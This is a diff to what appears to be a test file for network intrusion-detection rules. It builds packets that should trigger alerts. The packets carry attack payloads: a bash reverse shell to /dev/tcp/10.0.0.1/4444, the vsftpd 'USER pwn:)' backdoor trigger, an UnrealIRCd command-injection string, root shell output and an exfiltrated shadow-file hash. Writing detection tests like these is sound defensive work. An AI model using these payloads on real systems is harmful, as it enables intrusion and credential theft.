@@ -80,6 +80,26 @@ def test_reverse_shell():
         Raw(load=b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))]
     assert 2002001 in sids(run(pk))
 
+def test_vsftpd_backdoor():
+    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=1,dport=21,flags="PA")/
+        Raw(load=b"USER pwn:)\r\n"))]
+    assert 2003001 in sids(run(pk))
+
+def test_unrealircd_backdoor():
+    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=1,dport=6667,flags="PA")/
+        Raw(load=b"AB;id > /tmp/x\r\n"))]
+    assert 2003002 in sids(run(pk))
+
+def test_root_shell_observed():
+    pk=[eth(IP(src=TGT,dst=ATT)/TCP(sport=1524,dport=1,flags="PA")/
+        Raw(load=b"uid=0(root) gid=0(root) groups=0(root)\n"))]
+    assert 2003003 in sids(run(pk))
+
+def test_shadow_exfil():
+    pk=[eth(IP(src=TGT,dst=ATT)/TCP(sport=6200,dport=1,flags="PA")/
+        Raw(load=b"root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::"))]
+    assert 2003004 in sids(run(pk))
+
 def test_benign_no_false_positive():
     pk=[]
     for i in range(30):
